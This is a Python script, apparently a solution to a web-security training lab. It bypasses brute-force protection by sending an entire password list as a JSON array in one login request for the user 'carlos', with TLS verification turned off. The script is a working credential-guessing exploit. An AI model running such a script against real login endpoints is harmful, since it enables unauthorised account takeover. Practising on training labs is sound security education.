"""
Lab: Broken brute-force protection, multiple credentials per request

Step:
1. Read password list
2. Craft the request using JSON format and pass all passwords in a list inside the JSON object 
   {"username":"carlos", "password": ["abcdef", "fedcba", ...]}
3. If login is successful (302 redirect), confirm access

Author: N00BCYB0T
"""

import argparse
from colorama import Fore
import requests

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(description="Lab: Broken brute-force protection, multiple credentials per request")
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g.: https://vulnerableapp.com/)')
    parser.add_argument('--proxy', help="Proxy (e.g. http://127.0.0.1:8080)")
    args = parser.parse_args()

    print(f"{Fore.BLUE}Starting...{Fore.RESET}")

    session = setup_session(args.proxy)
    url = args.url.strip('/')

    print(f"{Fore.YELLOW}Step 1.{Fore.RESET} Reading password list...")
    passwords = read_password_list('../passwords.txt')

    print(f"{Fore.YELLOW}Step 2.{Fore.RESET} Sending login request...")
    response = login(session, url, passwords)

    if is_login_successful(response):
        print(f"{Fore.GREEN}[+] Lab Solved! Logged in as 'carlos'{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Login failed! Check your request manually.{Fore.RESET}")


def setup_session(proxy=None):
    session = requests.Session()
    session.verify = False

    if proxy:
        session.proxies = {
            'http': proxy,
            'https': proxy
        }
    return session


def read_password_list(filepath):
    try:
        with open(filepath, 'r') as file:
            passwords = [line.strip() for line in file if line.strip()]
            if not passwords:
                print(f"{Fore.RED}[-] Password list is empty!{Fore.RESET}")
                exit(1)
            return passwords
    except FileNotFoundError:
        print(f"{Fore.RED}[-] Password list file not found: {filepath}{Fore.RESET}")
        exit(1)


def login(session, url, passwords):
    json_data = {
        "username": "carlos",
        "password": passwords
    }
    headers = {
        "Content-Type": "application/json"
    }

    try:
        response = session.post(f"{url}/login", json=json_data, headers=headers, allow_redirects=True)
        return response
    except Exception as e:
        print(f"{Fore.RED}[-] Request error in login: {e}{Fore.RESET}")
        exit(1)


def is_login_successful(response):
    # Check based on the final URL or cookies (after redirects)
    if response.status_code == 200 and "Log out" in response.text:
        return True

    if response.status_code == 302:
        # Sometimes 302 alone is enough depending on the lab
        return True

    return False


if __name__ == "__main__":
    main()
